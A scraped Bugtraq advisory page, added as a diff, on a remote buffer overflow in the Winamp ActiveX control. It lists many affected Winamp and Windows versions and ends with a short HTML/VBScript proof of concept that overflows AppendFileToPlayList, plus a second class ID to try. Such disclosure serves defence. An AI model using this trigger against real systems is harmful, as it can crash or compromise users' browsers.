@@ -1,0 +1,1625 @@
+#SpeeDr00t@Black Falcon<br>#bid11107<p><b><span style="font-size: 18pt;">Nullsoft Winamp ActiveX Control Remote Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11107/info">info</a><br><a href="http://www.securityfocus.com/bid/11107/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11107/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11107/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11107/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11107
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 03 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 03 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to &lt;celebrityhacker@hushmail.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					NullSoft Winamp 5.0 5<br/>
+					
+				
+					NullSoft Winamp 5.0 4<br/>
+					
+				
+					NullSoft Winamp 5.0 3<br/>
+					
+				
+					NullSoft Winamp 5.0 2<br/>
+					
+				
+					NullSoft Winamp 5.0 1<br/>
+					
+				
+					NullSoft Winamp 3.1 <br/>
+					
+				
+					NullSoft Winamp 3.0 <br/>
+					
+				
+					NullSoft Winamp 2.91 <br/>
+					
+				
+					NullSoft Winamp 2.81 <br/>
+					
+				
+					NullSoft Winamp 2.80 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Advanced Server  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Advanced Server  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Advanced Server  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Datacenter Server  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Datacenter Server  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Datacenter Server  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Server  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Server  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Server  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Enterprise Server  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Enterprise Server  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Enterprise Server  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Enterprise Server  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Enterprise Server  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Server  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Server  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Server  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Server  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Server  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Server  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Server  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Server  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.79 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows XP Home  <br/>
+</span>
+					
+				
+					NullSoft Winamp 2.78 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows XP Home  <br/>
+</span>
+					
+				
+					NullSoft Winamp 2.77 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows XP Home  <br/>
+</span>
+					
+				
+					NullSoft Winamp 2.76 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows XP Home  <br/>
+</span>
+					
+				
+					NullSoft Winamp 2.75 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows XP Home  <br/>
+</span>
+					
+				
+					NullSoft Winamp 2.74 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.73  (full)<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.73 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows XP Home  <br/>
+</span>
+					
+				
+					NullSoft Winamp 2.72 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.71 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.70  (full)<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.70 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows XP Home  <br/>
+</span>
+					
+				
+					NullSoft Winamp 2.65 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.64  (standard)<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.62  (standard)<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.61  (full)<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.60  (lite)<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.60  (full)<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.50 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.24 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.10 <br/>
+					
+				
+					NullSoft Winamp 2.6 4<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.5 E<br/>
+					
+				
+					NullSoft Winamp 2.5  e<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					NullSoft Winamp 2.4 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT 3.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available:<br/>&lt;HTML&gt;<br/>&lt;HEAD&gt;<br/>&lt;META http-equiv=Content-Type content="text/html; charset=windows-1252"&gt;<br/>&lt;META content="MSHTML 6.00.2800.1400" name=GENERATOR&gt;&lt;/HEAD&gt;<br/>&lt;BODY&gt;<br/>&lt;OBJECT id=Kylie height=250 hspace=20 width=250 align=left classid=clsid:FA3662C3-<br/>B8E8-11D6-A667-0010B556D978&gt;<br/>&lt;PARAM NAME="Initialize" VALUE=""&gt;<br/>&lt;/OBJECT&gt;<br/>&lt;SCRIPT language=vbscript&gt;<br/><br/>  dim xint<br/>  dim haveIgotthebestbumorwhat<br/>  for xint = 1 to 5000<br/>  haveIgotthebestbumorwhat = foo &amp; "K"<br/>  next<br/>  Kylie.AppendFileToPlayList haveIgotthebestbumorwhat<br/><br/>&lt;/SCRIPT&gt;<br/>&lt;/BODY&gt;&lt;/HTML&gt;<br/><br/>If you're bored could also try -<br/><br/>CoAxTrack Class - {B9F3009B-976B-41C4-A992-229DCCF3367C}. <br/><br/><br/>Currently we are not aware of any exploits for this issue.#no_exploit &lt;mailto:vuldb@#no_exploit&gt;.
+	
+		<ul>
+</ul>
+</div>
